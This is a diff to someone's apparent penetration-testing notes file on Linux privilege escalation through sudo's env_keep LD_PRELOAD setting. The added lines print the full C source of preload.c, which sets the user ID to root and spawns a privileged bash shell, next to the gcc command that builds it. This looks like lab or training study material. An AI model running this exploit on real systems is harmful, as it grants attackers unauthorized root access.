@@ -1068,7 +1068,7 @@ tools:
 linenum.sh
 linpeas.sh
 </rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="environment_variables" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655874904.81" ts_lastsave="1655874928.94" unique_id="52">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="environment_variables" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655874904.81" ts_lastsave="1655875025.29" unique_id="52">
 				<rich_text>Sudo can be configured to inherit certain environment variables from the user's environment.
 Check which environment variables are inherited (look for the env_keep options):
 </rich_text>
@@ -1098,6 +1098,19 @@ Create a shared object using the code located at /home/user/tools/sudo/preload.c
 </rich_text>
 				<rich_text family="monospace">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</rich_text>
 				<rich_text>
+
+preload.c
+cat /home/user/tools/sudo/preload.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+        unsetenv(&quot;LD_PRELOAD&quot;);
+        setresuid(0,0,0);
+        system(&quot;/bin/bash -p&quot;);
+}
+
 Run one of the programs you are allowed to run via sudo (listed when running </rich_text>
 				<rich_text weight="heavy">sudo -l</rich_text>
 				<rich_text>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
